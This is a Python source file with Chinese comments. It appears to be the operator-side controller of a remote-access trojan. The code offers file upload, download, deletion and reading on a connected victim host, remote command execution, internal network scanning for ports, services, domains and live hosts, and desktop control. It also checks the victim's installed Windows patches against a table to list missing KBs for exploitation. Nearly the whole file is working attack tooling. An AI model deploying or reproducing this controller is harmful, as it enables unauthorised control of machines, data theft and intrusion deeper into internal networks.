#!/usr/bin/python3
# _*_ coding: utf-8 _*_
import configparser  # 读取配置文件的库
import socket
import struct  # 序列化和反序列化
import os
import json
import subprocess  # 启动一个新进程
from ctrl.desktop_ctrl import drew_tk
import sys
from ctrl.KB_dict import *
import re
# 全局变量读取配置文件
config = configparser.ConfigParser()
config.read('config.ini', 'utf8')


# 文件传输函数
def TransferFiles(conn):
    print("Usage: method filepath")
    print("++++++++++++++++++++++++++++++++Example+++++++++++++++++++++++++++++++\n")
    print("[Upload] upload \\root\\test.txt | upload \\root\\test.txt \\admin")
    print("[Download] download \\root\\test.txt")
    print("[Delete] delete \\root\\test.txt")
    print("[Read] read \\root\\test.txt")
    print("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n")
    while True:
        command = input("TransferFiles>>> ")
        # 对输入进行命令参数分割
        commandlist = command.split()
        # print(commandlist)
        # commandtest = commandlist[1].split('\\')
        # print(commandtest)
        # commandlist[1] = '\\'.join(commandtest)
        # print(commandlist[1])
        if commandlist[0] == 'exit':
            # 主控端退出相应模块的时候，也要通知被控端退出对应功能模块
            conn.send('exit'.encode('utf-8'))
            break
        if commandlist[0] == 'download':
            DownloadFile(conn, command)
        if commandlist[0] == 'upload':
            UploadFile(conn, command)
        if commandlist[0] == 'delete':
            DeleteFile(conn, command)
        if commandlist[0] == 'read':
            ReadFile(conn, command)


# 文件下载函数
def DownloadFile(conn, command):
    # 把主控端命令发送给被控端
    conn.send(command.encode('utf-8'))
    while True:
        # 先接收文件的信息，进行解析
        # 长度自定义，先接受文件信息的主要原因是防止粘包
        # 接收长度为128sl
        fileinfo = conn.recv(struct.calcsize('128sl'))
        if fileinfo:
            # 按照同样的格式（128sl）进行拆包
            filename, filesize = struct.unpack('128sl', fileinfo)
            # 把文件名后面的多余空字符去除
            filename = filename.decode('utf-8').strip('\00')
            # 定义文件上传的存放路径，./表示当前目录下
            newfilename = os.path.join('../', filename)
            print('Fileinfo Receive over! name:{0} size:{1}'.format(filename, filesize))

            # 接收文件内容
            # 表示已经接收到的文件内容的大小
            recvdsize = 0
            print('start receiving...')
            with open(newfilename, 'wb') as f:
                # 分次分块写入
                while not recvdsize == filesize:
                    if filesize - recvdsize > 1024:
                        data = conn.recv(1024)
                        f.write(data)
                        recvdsize += len(data)
                    else:
                        # 当剩余内容不足1024时，则直接把剩下的内容全部接收写入
                        data = conn.recv(filesize - recvdsize)
                        f.write(data)
                        recvdsize = filesize
                        f.close()
                        break
            print("File Receive over!!!")
        break


# 文件上传函数
def UploadFile(conn, command):
    # 把主控端的命令发送给被控端
    # conn.send(command.encode('utf-8'))
    # 从命令中分离出要上传的文件路径
    commandlist = command.split()
    conn.send(command.encode('utf-8'))
    # print(commandlist)
    while True:
        uploadfilepath = commandlist[1]
        if os.path.isfile(uploadfilepath):
            # 先传输文件信息防止粘包
            # 定义文件信息，128s表示文件名长度为128字节，l表示用int类型表示文件大小
            # 把文件名和文件大小信息进行封装，发给接收端
            fileinfo = struct.pack('128sl', bytes(os.path.basename(uploadfilepath).encode('utf-8')),
                                   os.stat(uploadfilepath).st_size)
            conn.send(fileinfo)
            print('[+] Fileinfo send success! name:{0} size:{1}'.format(os.path.basename(uploadfilepath),
                                                                        os.stat(uploadfilepath).st_size))

            # 开始传输文件的内容
            print('[+] start uploading...')
            with open(uploadfilepath, 'rb') as f:
                while True:
                    # 分块多次读，防止文件过大时一次性读完导致内存不足
                    data = f.read(1024)
                    if not data:
                        f.close()
                        print("File Send Over!")
                        break
                    conn.send(data)
            break


# 文件删除函数
def DeleteFile(conn, command):
    conn.send(command.encode('utf-8'))
    commandlist = command.split()
    print("Are you sure to delete the file: " + commandlist[1])
    answer = input('[yes/no]>>>')
    conn.send(answer.encode('utf-8'))
    if answer == 'yes':
        res = conn.recv(1024).decode('utf-8')
        if res == 'no':
            print('[!] Failed to delete the file!\n')
            TransferFiles(conn)
        elif res == 'yes':
            print('[*] Success!')
        elif res == 'notexist':
            print('[!] The file not exist!')
            TransferFiles(conn)
    else:
        TransferFiles(conn)


# 文件读取
def ReadFile(conn, command):
    conn.send(command.encode('utf-8'))
    # 接收客户端的数据
    # 1.先收报头长度（报头的作用是为了防止粘包的情况发生）
    res = conn.recv(1024).decode('utf-8')
    if res == 'yes':
        obj = conn.recv(4)
        header_size = struct.unpack('i', obj)[0]
        # 2.收报头
        header_bytes = conn.recv(header_size)
        # 3.从报头中解析出数据的真实信息（报头字典）
        header_json = header_bytes.decode('utf-8')
        header_dic = json.loads(header_json)
        total_size = header_dic['total_size']
        # 4.接受真实数据
        recv_size = 0
        recv_data = b''
        while recv_size < total_size:
            res = conn.recv(1024)
            recv_data += res
            recv_size += len(res)
        # windows终端默认编码是gbk,所以得用gbk进行解码
        print(recv_data.decode('utf-8'))
    else:
        print("[!] The file path not exist!")
        TransferFiles(conn)


# 远程命令执行
def ExecCommand(conn):
    while True:
        command = input('[ExecCommand]>>> ').strip()
        commandlist = command.split()
        if not command:
            continue
        if commandlist[0] == 'exit':
            conn.sendall('exit'.encode())
            break
        # 给客户端发送命令
        conn.send(command.encode('utf-8'))
        # conn.sendall(command.encode())
        # result = conn.recv(10000).decode()
        # print(result)
        if commandlist[0] == 'cd':
            pwd = conn.recv(10000).decode('utf-8')
            print(pwd)
        else:
            # 接收客户端的数据
            # 1.先收报头长度（报头的作用是为了防止粘包的情况发生）
            obj = conn.recv(4)
            header_size = struct.unpack('i', obj)[0]
            # 2.收报头
            header_bytes = conn.recv(header_size)
            # 3.从报头中解析出数据的真实信息（报头字典）
            header_json = header_bytes.decode('utf-8')
            header_dic = json.loads(header_json)
            total_size = header_dic['total_size']
            # 4.接受真实数据
            recv_size = 0
            recv_data = b''
            while recv_size < total_size:
                res = conn.recv(1024)
                recv_data += res
                recv_size += len(res)
            # windows终端默认编码是gbk,所以得用gbk进行解码
            if commandlist[0] == 'type':
                print(recv_data.decode('utf-8'))
            else:
                print(recv_data.decode('gbk'))


# 被动连接:server端监听 ；client端连接
def connect_passive():
    try:
        # 读取配置文件中server端的ip和port
        listenIp = config.get("passive", "listenip")  # ip需要字符型
        listenPort = config.getint("passive", "listenport")  # port需要整型
        listenAddr = (listenIp, listenPort)
        try:
            serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            serverSocket.bind(listenAddr)
            serverSocket.listen(1)
        except socket.error as e:
            raise e
        print("[*]Server is up! Waiting connection...!")
        conn, addr = serverSocket.accept()
        hostname = conn.recv(1024)
        print(("[+]Host is up! \n ============\n name:{0} ip:{1} \n port:{2} \n ============ \n".format(
            bytes.decode(hostname), addr[0], addr[1])))
        return conn

    except Exception as e:
        print(f"Passive conntion error! err:{e}")
        sys.exit(1)


# 主动连接：server端连接 ；client端监听
def connect_active():
    try:
        # 读取配置文件中client端的ip和port
        clientIp = config.get("active", "clientip")  # ip需要字符型
        clientPort = config.getint("active", "clientport")  # port需要整型
        try:
            # 创建tcp型socket套接字
            conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            conn.connect((clientIp, clientPort))
            print("[*]Server is up! Connecting...")
        except socket.error as message:
            print(message)
            sys.exit(0)
        # 发送client端主机名
        hostname = subprocess.check_output("hostname")
        conn.sendall(hostname)
        flag = conn.recv(1024).decode('utf-8')
        if flag == 'yes':
            clientname = conn.recv(1024)
            clientinfo = conn.getpeername()
            # print(conn.getpeername())
            print(("[+]Host is up! \n ============\n name:{0} ip:{1} \n port:{2} \n ============ \n".format(
                bytes.decode(clientname),
                clientinfo[0],
                clientinfo[1])))
        return conn
    except Exception as msg:
        print("Active connection error!")


# 内网扫描模块
def NetworkScan(conn):
    while True:
        print("Functional selection:\n")
        print("[1] PortScan \n")
        print("[2] ServiceScan \n")
        print("[3] DomainScan \n")
        print("[4] AlivehostScan(3-4 mins)\n")
        command = input("NetworkScan>>> ")
        # 对输入进行命令参数分割
        if command == 'exit':
            # 主控端退出相应模块的时候，也要通知被控端退出对应功能模块
            conn.send('exit'.encode('utf-8'))
            break
        if command == '1':
            PortScan(conn, command)
        if command == '2':
            ServiceScan(conn, command)
        if command == '3':
            DomainScan(conn, command)
        if command == '4':
            AlivehostScan(conn, command)


# 端口扫描
def PortScan(conn, command):
    conn.send(command.encode('utf-8'))
    # 接收客户端的数据
    # 1.先收报头长度（报头的作用是为了防止粘包的情况发生）
    obj = conn.recv(4)
    header_size = struct.unpack('i', obj)[0]
    # 2.收报头
    header_bytes = conn.recv(header_size)
    # 3.从报头中解析出数据的真实信息（报头字典）
    header_json = header_bytes.decode('utf-8')
    header_dic = json.loads(header_json)
    total_size = header_dic['total_size']
    # 4.接受真实数据
    recv_size = 0
    recv_data = b''
    while recv_size < total_size:
        res = conn.recv(1024)
        recv_data += res
        recv_size += len(res)
    # windows终端默认编码是gbk,所以得用gbk进行解码
    print("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
    print(recv_data.decode('gbk'))
    print("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")


# 服务探测
def ServiceScan(conn, command):
    conn.send(command.encode('utf-8'))
    # 接收客户端的数据
    # 1.先收报头长度（报头的作用是为了防止粘包的情况发生）
    obj = conn.recv(4)
    header_size = struct.unpack('i', obj)[0]
    # 2.收报头
    header_bytes = conn.recv(header_size)
    # 3.从报头中解析出数据的真实信息（报头字典）
    header_json = header_bytes.decode('utf-8')
    header_dic = json.loads(header_json)
    total_size = header_dic['total_size']
    # 4.接受真实数据
    recv_size = 0
    recv_data = b''
    while recv_size < total_size:
        res = conn.recv(1024)
        recv_data += res
        recv_size += len(res)
    # windows终端默认编码是gbk,所以得用gbk进行解码
    print("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
    print(recv_data.decode('gbk'))
    print("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")


# 域环境探测
def DomainScan(conn, command):
    conn.send(command.encode('utf-8'))
    # 接收客户端的数据
    # 1.先收报头长度（报头的作用是为了防止粘包的情况发生）
    obj = conn.recv(4)
    header_size = struct.unpack('i', obj)[0]
    # 2.收报头
    header_bytes = conn.recv(header_size)
    # 3.从报头中解析出数据的真实信息（报头字典）
    header_json = header_bytes.decode('utf-8')
    header_dic = json.loads(header_json)
    total_size = header_dic['total_size']
    # 4.接受真实数据
    recv_size = 0
    recv_data = b''
    while recv_size < total_size:
        res = conn.recv(1024)
        recv_data += res
        recv_size += len(res)
    # windows终端默认编码是gbk,所以得用gbk进行解码
    print("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
    print(recv_data.decode('gbk'))
    print("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")


# 存活主机探测
def AlivehostScan(conn, command):
    conn.send(command.encode('utf-8'))
    res = conn.recv(1024).decode('utf-8')
    # 接收客户端的数据
    # 1.先收报头长度（报头的作用是为了防止粘包的情况发生）
    if res == 'null':
        print('Not alive host !')
    elif res == 'yes':
        obj = conn.recv(4)
        header_size = struct.unpack('i', obj)[0]
        # 2.收报头
        header_bytes = conn.recv(header_size)
        # 3.从报头中解析出数据的真实信息（报头字典）
        header_json = header_bytes.decode('utf-8')
        header_dic = json.loads(header_json)
        total_size = header_dic['total_size']
        # 4.接受真实数据
        recv_size = 0
        recv_data = b''
        while recv_size < total_size:
            res = conn.recv(1024)
            recv_data += res
            recv_size += len(res)
        # windows终端默认编码是gbk,所以得用gbk进行解码
        print("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
        print(recv_data.decode('gbk'))
        print("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")


# 补丁扫描
# 补丁扫描
def KBScan(conn):
    # conn.send(command.encode('utf-8'))
    # 接收客户端的数据
    # 1.先收报头长度（报头的作用是为了防止粘包的情况发生）
    obj = conn.recv(4)
    header_size = struct.unpack('i', obj)[0]
    # 2.收报头
    header_bytes = conn.recv(header_size)
    # 3.从报头中解析出数据的真实信息（报头字典）
    header_json = header_bytes.decode('utf-8')
    header_dic = json.loads(header_json)
    total_size = header_dic['total_size']
    # 4.接受真实数据
    recv_size = 0
    recv_data = b''
    while recv_size < total_size:
        res = conn.recv(1024)
        recv_data += res
        recv_size += len(res)
    # windows终端默认编码是gbk,所以得用gbk进行解码
    print("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
    print(recv_data.decode('gbk'))
    print("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
    os_name = ""
    kbs = []
    recv_data = recv_data.decode('gbk')
    for line in recv_data.split("\r\n"):
        if "KB" in line:
            kb_tmp = line.replace(" ", "")[5:]
            # kb = kb_tmp.replace("\r", "")
            kbs.append(kb_tmp)
        if "OS 名称" in line:
            os_name_tmp = line[6:].replace("\n", "").replace("\r", "")
            os_name = re.search("Microsoft.*", os_name_tmp).group()
            # print(os_name)

    if os_name == "":
        print("not find os name\n")
        return
    if os_name not in kb_dict.keys():
        print(f"["+ os_name +"] not in kb dict")
        print(f"kb dict {kb_dict.keys()}\n")
        return
    print(f"The target os is {os_name}")
    print(f"The target have these kbs:")

    for kb in kbs:
        print(kb)
    print(f"The target need to load kbs: ")
    for kb in kb_dict[os_name]:
        if kb not in kbs:
            print(kb)
    print("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")


# 桌面控制
def DesktopCtrl():
    drew_tk()
    return

if __name__ == '__main__':
    # print(listenAddr)
    # print(listenIp)
    # print(listenPort)
    print("Plesse select a connection mode!")
    print("[a]Active connection \n")
    print("[p]Passive connection\n")
    while True:
        connect_choice = input('[ConnectWay]>>> ')
        if connect_choice == 'a':
            conn = connect_active()
            break
        elif connect_choice == 'p':
            conn = connect_passive()
            break
        else:
            print("Input error!\n")
    try:
        while True:
            print("Functional selection:\n")
            print("[1]TransferFiles \n")
            print("[2]ExecCommand \n")
            print("[3]NetworkScan \n")
            print("[4]KBScan \n")
            print("[5]DesktopCtrl \n")
            choice = input('[None]>>> ')
            # 给被控端发送指令主控端进入相应的功能模块
            if choice == '1':
                conn.send('1'.encode('utf-8'))
                TransferFiles(conn)
            elif choice == '2':
                # 发送命令为str型，需要用到encode函数把命令转换为bytes型
                conn.send('2'.encode('utf-8'))
                ExecCommand(conn)
            elif choice == '3':
                # 发送命令为str型，需要用到encode函数把命令转换为bytes型
                conn.send('3'.encode('utf-8'))
                NetworkScan(conn)
            elif choice == '4':
                # 发送命令为str型，需要用到encode函数把命令转换为bytes型
                conn.send('4'.encode('utf-8'))
                KBScan(conn)
            elif choice == '5':
                # 发送命令为str型，需要用到encode函数把命令转换为bytes型
                conn.send('5'.encode('utf-8'))
                DesktopCtrl()
            elif choice == 'exit':
                conn.send('exit'.encode('utf-8'))
                conn.close()
                break
    except Exception as e:
        print(f"error : {e}")
        conn.close()
